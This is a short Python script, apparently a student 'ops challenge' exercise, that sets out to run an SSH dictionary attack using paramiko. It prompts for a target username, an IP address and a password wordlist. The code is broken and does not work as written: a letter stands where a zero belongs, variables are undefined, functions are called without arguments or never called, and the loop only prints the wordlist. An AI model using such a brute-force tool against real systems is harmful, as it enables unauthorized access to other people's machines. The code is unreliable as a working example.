#!/usr/bin/env python3
###########################
# Title: OpsChallenge16
# Author:Jeff Snyder
# Date: 26OCT2020
# Purpose: Dictionary attack against SSH connection
###########################
import smtplib
import itertools
import sys
import time
import getpass
import paramiko
import os
import socket


def bruteForceSSH(password, code =O):

    ssh=paramiko.SSHClient()
    # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host,port=22, username=user, password=password)
    except paramiko.AuthenticationException:
        code =1
    # except socket.error, e:
    #     code =2
    ssh.close()
    return code

def cracker(user, ipAddress, txtFile, ):
    filepath =txtFile
    for i in filepath.readlines():
        password=i.strip("\n")
    with open(filepath) as fp:
        line = fp.readline()
        while line:
            print("{}".format(line.strip()))
            line = fp.readline()
            # print(line)
            time.sleep(1)
# def mode2():
#     passwordCheck=input("Please enter the password to check.   ")
#     filepath =input("What is the file path of the text file?   ")
#     with open(filepath) as fp:
#         line = fp.readline()
#         while line:
#             line=line.strip()
#             if line == passwordCheck:
#                 print("Your password of {} is a match in the dictionary".format(passwordCheck))
#                 break
#             else:
#                 print("{}".format(line.strip()))
#                 line = fp.readline()

# usr_password = getpass.getpass(prompt=“please enter your password”)



def main():
    print("Shall we play a game?")
    user=input("What is the username for the SSH connection?")
    ipAddress=input("What is the ip address of the target system?")
    txtFile=input("What is the folder path to your dictionary file?")
    bruteForceSSH()
    
main()



# with help from https://stackabuse.com/read-a-file-line-by-line-in-python/